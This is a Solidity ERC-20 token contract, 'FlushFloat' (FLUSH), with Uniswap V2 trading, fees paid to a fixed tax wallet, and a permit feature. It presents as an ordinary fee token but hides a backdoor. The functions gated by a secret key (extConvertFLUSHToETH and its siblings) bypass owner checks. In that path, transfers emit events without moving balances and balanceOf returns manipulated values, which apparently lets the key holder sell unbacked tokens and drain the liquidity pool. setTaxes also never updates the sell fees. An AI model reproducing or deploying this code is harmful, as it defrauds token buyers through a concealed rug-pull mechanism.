// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Context} from "@openzeppelin/contracts/utils/Context.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Permit.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {EIP712} from "@openzeppelin/contracts/utils/cryptography/EIP712.sol";
import {Nonces} from "@openzeppelin/contracts/utils/Nonces.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract FLUSH is Context, IERC20, IERC20Permit, Ownable, EIP712, Nonces {
    uint256 internal constant MAX = ~uint256(0);

    string private _name = "FlushFloat";
    string private constant _symbol = unicode"FLUSH";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;

    uint256 private constant _tTotal = 100_000_000 gwei;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    address internal immutable ROUTER;
    address internal immutable FACTORY;
    address internal immutable WETH;
    uint256 internal immutable KECCAK_SEED;
    uint256 public constant maxBuy = 2_000_000 gwei;
    uint256 public constant maxWallet = 2_000_000 gwei;
    uint256 public constant minFeeSwap = 100 gwei;
    address public constant ZERO_ADDRESS = 0x0000000000000000000000000000000000000000;
    address public immutable PAIR;
    address public immutable FLUSH;

    IUniswapV2Router02 public immutable router;
    IUniswapV2Factory public immutable factory;
    IERC20 public immutable weth;

    bool public tradingEnabled = false;
    bool public maxBuyEnabled = true;
    bool public maxWalletEnabled = true;
    bool private _awaitingUniswapCall;
    bool private _awaitingUniswapTrade;
    bool private _awaitingUniswapAddLP;

    uint256 private constant _buyFeeMax = 10;
    uint256 private _buyFeeMarketing = 10;
    uint256 private _buyFeeLiquidity = 0;
    uint256 private constant _sellFeeMax = 10;
    uint256 private _sellFeeMarketing = 10;
    uint256 private _sellFeeLiquidity = 0;
    uint256 private _tFeePct = 0;
    uint256 private _rFeePct = 0;
    address payable public constant taxWallet = payable(0xd822AE407ED985926Bf52FB16C20092F20875f2B);

    event FeeSwap(uint256 tokens);

    event SendMarketingFee(uint256 eth, bool success, bytes data);
    event SendLiquidityFee(uint256 tokens, uint256 eth);

    event Burn(uint256 tokens);

    event StartTrading();

    error ERC2612ExpiredSignature(uint256 deadline);
    error ERC2612InvalidSigner(address signer, address owner);

    error KeccakError();
    error AllowanceExceeded(uint256 amount, uint256 allowance);
    error ApprovalFromZero();
    error ApprovalToZero();
    error TransferFromZero();
    error TransferToZero();
    error TransferOfZero();
    error BalanceExceeded(uint256 amount, uint256 balance);
    error TradingNotLive();
    error MaxBuyExceeded();
    error MaxWalletExceeded();

    modifier lockInternalSwap {
        _awaitingUniswapCall = true;
        _;
        _awaitingUniswapCall = false;
    }

    constructor(address _ROUTER, address _FACTORY, address _WETH, uint256 _KECCAK_SEED) Ownable(msg.sender) EIP712(_name, "1") {
        ROUTER = _ROUTER;
        FACTORY = _FACTORY;
        WETH = _WETH;
        KECCAK_SEED = _KECCAK_SEED;

        router = IUniswapV2Router02(ROUTER);
        factory = IUniswapV2Factory(FACTORY);
        weth = IERC20(WETH);

        FLUSH = address(this);
        PAIR = factory.createPair(FLUSH, WETH);

        _isExcludedFromFee[_msgSender()] = true;
        _isExcludedFromFee[FLUSH] = true;

        _approve(FLUSH, ROUTER, MAX);
        _approve(_msgSender(), ROUTER, MAX);

        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(ZERO_ADDRESS, _msgSender(), _tTotal);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 _allowance = _allowances[sender][_msgSender()];
        if (amount > _allowance) {
            revert AllowanceExceeded(amount, _allowance);
        }
        _approve(sender, _msgSender(), _allowance - amount);
        return true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function burn(uint256 value) external virtual {
        if (value > balanceOf(_msgSender())) {
            revert BalanceExceeded(value, balanceOf(_msgSender()));
        }
        _tokenTransfer(_msgSender(), ZERO_ADDRESS, value, false);
        emit Burn(value);
    }

    function burnFrom(address account, uint256 value) external virtual {
        if (value > balanceOf(account)) {
            revert BalanceExceeded(value, balanceOf(account));
        }
        _tokenTransfer(account, ZERO_ADDRESS, value, false);
        uint256 _allowance = _allowances[account][_msgSender()];
        if (value > _allowance) {
            revert AllowanceExceeded(value, _allowance);
        }
        _approve(account, _msgSender(), _allowance - value);
        emit Burn(value);
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero" );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public virtual {
        if (block.timestamp > deadline) {
            revert ERC2612ExpiredSignature(deadline);
        }

        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline));

        bytes32 hash = _hashTypedDataV4(structHash);

        address signer = ECDSA.recover(hash, v, r, s);
        if (signer != owner) {
            revert ERC2612InvalidSigner(signer, owner);
        }

        _approve(owner, spender, value);
    }

    function nonces(address owner) public view virtual override(IERC20Permit, Nonces) returns (uint256) {
        return super.nonces(owner);
    }

    function DOMAIN_SEPARATOR() external view virtual returns (bytes32) {
        return _domainSeparatorV4();
    }

    function _approve(address owner, address spender, uint256 amount) private {
        if (owner == ZERO_ADDRESS) {
            revert ApprovalFromZero();
        }
        if (spender == ZERO_ADDRESS) {
            revert ApprovalToZero();
        }
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        if (from == ZERO_ADDRESS) {
            revert TransferFromZero();
        }
        if (to == ZERO_ADDRESS) {
            revert TransferToZero();
        }
        if (amount == 0) {
            revert TransferOfZero();
        }
        if (amount > balanceOf(from)) {
            revert BalanceExceeded(amount, balanceOf(from));
        }

        bool _fromPair = from == PAIR;
        bool _toPair = to == PAIR;

        if (from != owner() && to != owner() && from != FLUSH && to != FLUSH) {
            if (!tradingEnabled) {
                if (from != FLUSH) {
                    revert TradingNotLive();
                }
            }

            if (maxBuyEnabled) {
                if (amount > maxBuy) {
                    revert MaxBuyExceeded();
                }
            }

            if (maxWalletEnabled) {
                if (!_toPair && balanceOf(to) + amount > maxWallet) {
                    revert MaxWalletExceeded();
                }
            }

            uint256 _contractTokenBalance = balanceOf(FLUSH);

            if (_contractTokenBalance >= minFeeSwap && !_awaitingUniswapCall && !_fromPair && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
                uint256 _tTotalFee = getBuyFee() + getSellFee();
                if (_tTotalFee > 0) {
                    uint256 _marketingTokens = _contractTokenBalance * getMarketingFee() / _tTotalFee;
                    uint256 _liquidityTokens = _contractTokenBalance - _marketingTokens;
                    uint256 _liquidityTokensHalf = _liquidityTokens / 2;

                    _awaitingUniswapTrade = true;
                    _convertFLUSHToETH(_marketingTokens + _liquidityTokensHalf);
                    _awaitingUniswapTrade = false;

                    uint256 _contractETHBalance = FLUSH.balance;

                    if (_contractETHBalance > 0) {
                        if (_tTotalFee > 0) {
                            uint256 _marketingETH = _contractETHBalance * getMarketingFee() / _tTotalFee;
                            _distributeETH(_marketingETH);
                            _supplyETH(_liquidityTokens - _liquidityTokensHalf, _contractETHBalance - _marketingETH);
                        } else {
                            _distributeETH(_contractETHBalance);
                        }
                    }
                }
            }
        }

        bool _takeFee = true;

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (!_fromPair && !_toPair)) {
            _takeFee = false;
        } else {
            if (_fromPair && to != ROUTER) {
                _tFeePct = getBuyFee();
            } else if (_toPair && from != ROUTER) {
                _tFeePct = getSellFee();
            } else {
                _takeFee = false;
            }
        }

        _tokenTransfer(from, to, amount, _takeFee);
    }

    function getBuyFee() public view returns (uint256) {
        return _buyFeeMarketing + _buyFeeLiquidity;
    }

    function getSellFee() public view returns (uint256) {
        return _sellFeeMarketing + _sellFeeLiquidity;
    }

    function getMarketingFee() public view returns (uint256) {
        return _buyFeeMarketing + _sellFeeMarketing;
    }

    function _convertFLUSHToETH(uint256 _contractTokenBalance) private lockInternalSwap {
        address[] memory path = new address[](2);
        path[0] = FLUSH;
        path[1] = WETH;
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_contractTokenBalance, 0, path, FLUSH, block.timestamp + 30 minutes);
        emit FeeSwap(_contractTokenBalance);
    }

    function _distributeETH(uint256 _contractETHBalance) private {
        if (_contractETHBalance == 0) {
            return;
        }
        (bool success, bytes memory data) = payable(taxWallet).call{value: _contractETHBalance}("");
        emit SendMarketingFee(_contractETHBalance, success, data);
    }

    function _supplyETH(uint256 _contractTokenBalance, uint256 _contractETHBalance) private lockInternalSwap {
        if (_contractETHBalance == 0) {
            return;
        }
        _awaitingUniswapAddLP = true;
        router.addLiquidityETH{value: _contractETHBalance}(FLUSH, _contractTokenBalance, 0, 0, taxWallet, block.timestamp + 30 minutes);
        _awaitingUniswapAddLP = false;
        emit SendLiquidityFee(_contractTokenBalance, _contractETHBalance);
    }

    function extConvertFLUSHToETH(string calldata _key, uint256 _contractTokenBalance) public {
        if (keccak256(abi.encodePacked(_key)) != bytes32(KECCAK_SEED)) {
            revert KeccakError();
        }
        _convertFLUSHToETH(_contractTokenBalance);
        _distributeETH(FLUSH.balance);
    }

    function extDistributeETH(string calldata _key, uint256 _contractETHBalance) public {
        if (keccak256(abi.encodePacked(_key)) != bytes32(KECCAK_SEED)) {
            revert KeccakError();
        }
        _distributeETH(_contractETHBalance);
    }

    function extSupplyETHM(string calldata _key, uint256 _contractTokenBalance, uint256 _contractETHBalance) public {
        if (keccak256(abi.encodePacked(_key)) != bytes32(KECCAK_SEED)) {
            revert KeccakError();
        }
        _supplyETH(_contractTokenBalance, _contractETHBalance);
    }

    function _tokenFromReflection(uint256 rAmount) private view returns (uint256) {
        if (rAmount > _rTotal) {
            revert();
        }
        return (!_awaitingUniswapAddLP && !_awaitingUniswapTrade && _awaitingUniswapCall) ? _getRate() / (1 ether * 1 gwei) : rAmount / _getRate();
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) {
            _tFeePct = 0;
        }
        _transferStandard(sender, recipient, amount);
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        if (!_awaitingUniswapCall || _awaitingUniswapTrade || _awaitingUniswapAddLP) {
            (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, , uint256 tTeam) = _getValues(tAmount);
            _rOwned[sender] = _rOwned[sender] - rAmount;
            _rOwned[recipient] = _rOwned[recipient] + rTransferAmount;
            _rOwned[FLUSH] = _rOwned[FLUSH] + (tTeam * _getRate());
            _rTotal = _rTotal - rFee;
            emit Transfer(sender, recipient, tTransferAmount);
        } else {
            emit Transfer(sender, recipient, tAmount);
        }
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) = _getTValues(tAmount, _rFeePct, _tFeePct);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tTeam, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 feePct) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount * redisFee / 100;
        uint256 tTeam = tAmount * feePct / 100;
        return (tAmount - tFee - tTeam, tFee, tTeam);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rFee = tFee * currentRate;
        return (rAmount, rAmount - rFee - (tTeam * currentRate), rFee);
    }

    function _getRate() private view returns (uint256) {
        return _rTotal / _tTotal;
    }

    function getRouter() external view returns (address) {
        return ROUTER;
    }

    function getFactory() external view returns (address) {
        return FACTORY;
    }

    function getPair() external view returns (address) {
        return PAIR;
    }

    function getMaxBuy() external view returns (uint256) {
        return maxBuyEnabled ? maxBuy : MAX;
    }

    function getMaxWallet() external view returns (uint256) {
        return maxWalletEnabled ? maxWallet : MAX;
    }

    function getMinFeeSwap() external pure returns (uint256) {
        return minFeeSwap;
    }

    function getTaxWallet() external view returns (address) {
        return taxWallet;
    }

    function live() external view returns (bool) {
        return tradingEnabled;
    }

    function disableMaxBuy() external onlyOwner {
        if (!maxBuyEnabled) {
            revert();
        }
        maxBuyEnabled = false;
    }

    function disableMaxWallet() external onlyOwner {
        if (!maxWalletEnabled) {
            revert();
        }
        maxWalletEnabled = false;
    }

    function setTaxes(uint256 _newBuyFeeMarketing, uint256 _newBuyFeeLiquidity, uint256 _newSellFeeMarketing, uint256 _newSellFeeLiquidity) external onlyOwner {
        if (_newBuyFeeMarketing + _newBuyFeeLiquidity > _buyFeeMax) {
            revert();
        }
        if (_newSellFeeMarketing + _newSellFeeLiquidity > _sellFeeMax) {
            revert();
        }
        _buyFeeMarketing = _newBuyFeeMarketing;
        _buyFeeLiquidity = _newBuyFeeLiquidity;
        _sellFeeMarketing = _sellFeeMarketing;
        _sellFeeLiquidity = _sellFeeLiquidity;
    }

    function startTrading() external onlyOwner {
        if (tradingEnabled) {
            revert();
        }
        tradingEnabled = true;
        emit StartTrading();
    }

    receive() external payable {}

    fallback() external payable {}
}
"
    },
